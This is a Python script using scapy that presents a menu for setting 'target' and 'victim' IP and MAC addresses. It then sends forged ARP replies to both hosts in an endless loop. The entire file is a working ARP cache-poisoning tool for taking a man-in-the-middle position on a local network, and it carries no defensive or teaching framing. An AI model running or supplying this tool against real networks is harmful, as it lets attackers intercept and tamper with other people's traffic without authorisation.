import os
import sys
import time
from scapy.all import *

global TargetIP
global TargetMAC
global VictimIP
global VictimMAC

def CheckARP():
    os.system("clear")
    print("************** Present ARP **************")
    os.system("arp -a")
    print("")
    print("*****************************************")
    print("**************** MY IP *******************")
    print("")
    os.system("ifconfig")
    main()

def setTarget():
    global TargetIP
    global TargetMAC

    os.system("clear")
    os.system("arp -a")

    print("")

    print("------------- Set Target IP -------------")
    TargetIP = raw_input(">> ")

    print("------------- Set Target MAC -------------")
    TargetMAC = raw_input(">> ")
    main()

def setVictim():
    global VictimIP
    global VictimMAC

    print("----------------- Set Victim IP -----------------")
    VictimIP = raw_input(">> ")
    print("----------------- Set Victim MAC -----------------")
    VictimMAC = raw_input(">> ")
    main()

def checkNowset():
    global TargetIP
    global TargetMAC
    global VictimIP
    global VictimMAC

    os.system("clear")

    print("------------------------------------------------")
    print("Target IP -> "+str(TargetIP))
    print("Target MAC -> "+str(TargetMAC))
    print("------------------------------------------------")
    print("Victim IP -> "+str(VictimIP))
    print("Victim MAC -> "+str(VictimMAC))

def spoofing():
    global TargetIP
    global TargetMAC
    global VictimIP
    global VictimMAC

    print("Present Settings")
    checkNowset()

    # To router
    spof_1 = ARP()
    spof_1.hwdst = VictimMAC
    spof_1.psrc = TargetIP
    spof_1.pdst = VictimIP

    # To Victim
    spof_2 = ARP()
    spof_2.hwdst = TargetMAC
    spof_2.psrc = VictimIP
    spof_2.pdst = TargetIP

    print("Start ARP Spoofing!")

    while(1):
        send(spof_1)
        time.sleep(1)
        send(spof_2)
        time.sleep(1)

def main():
    print("###########################")
    print("1. Check ARP")
    print("2. Set Target IP & MAC Address")
    print("3. Set Victim IP & MAC Address")
    print("4. ARP Spoofing")
    print("8. Exit")
    print("###########################")

    num = raw_input(">>")

    if num == '8':
        os.system("exit")
    elif num == '1':
        CheckARP()
    elif num == '2':
        setTarget()
    elif num == '3':
        setVictim()
    elif num == '4':
        spoofing()


if __name__ == "__main__":
    main()
